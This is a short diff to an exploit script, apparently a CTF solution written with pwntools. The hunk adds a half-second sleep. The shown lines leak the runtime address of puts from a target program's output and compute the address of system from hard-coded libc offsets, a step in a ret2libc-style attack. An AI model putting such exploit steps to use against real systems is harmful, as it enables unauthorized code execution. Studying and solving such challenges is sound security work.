@@ -329,6 +329,7 @@ def delete(index):
 delete(0)
 
 puts_libc=u32(p.recvuntil('Delete success.\n')[0:4])
+sleep(0.5)
 puts_off=392352
 system_off=241056
 system_libc=puts_libc-puts_off+system_off         # leak libc
